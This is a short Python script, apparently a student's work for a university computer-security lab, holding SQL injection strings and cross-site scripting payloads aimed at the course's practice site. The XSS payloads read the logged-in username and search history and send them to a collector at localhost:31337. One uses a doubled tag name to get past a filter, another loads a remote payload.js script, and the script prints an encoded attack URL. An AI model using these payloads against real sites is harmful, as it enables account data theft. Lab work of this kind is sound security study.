sql = "SELECT * FROM `users` WHERE location='{}'"
injection = "'||1-- "
# print(sql.format(injection))

# 2720204f522027792720203d20202779 # A potential md5 hash that may be translated to what we want?
# 0dd214be0b9bbbbde2a8d56231626318

import urllib.parse as parse

xss_0 = """
<script>
  $(function() {
    var username = window.document.getElementById("logged-in-user").innerHTML;
    var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
  });
</script>
"""

xss_1 = """
<scrscriptipt>
  $(function() {
    var username = window.document.getElementById("logged-in-user").innerHTML;
    var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
  });
</scrscriptipt>
"""

xss_3 = """
<script src=https://combinatronics.com/miyo6032/Computer-Security/master/Project%202/payload.js></script>
"""

xss_3 = """
<script>
  $(function() {
    $.get(`http://localhost:31337/?stolen_user=` + window.document.getElementById(`logged-in-user`).innerHTML + `&last_search=` + window.document.getElementsByClassName(`history-item list-group-item`)[1].innerHTML);
  });
</script>
"""

print("https://project2.ecen4133.org/search?xssdefense=3&q=" + parse.quote_plus(xss_3))
# print("sql_0:", parse.unquote("""%27%20OR%20%27y%27%20%3D%20%27y"""))
# print("sql_1:", parse.unquote("""%5C%27%27%20OR%201%20%3D%201%20--%20"""))
# print("sql_2:{}".format(parse.unquote("""%27%3D%27%0C%13.%C3%BC%C3%B2%C3%B4%0A%C3%9E7%C3%A7%C3%8F%C3%9B%C3%89""", "UTF-8", errors='replace')))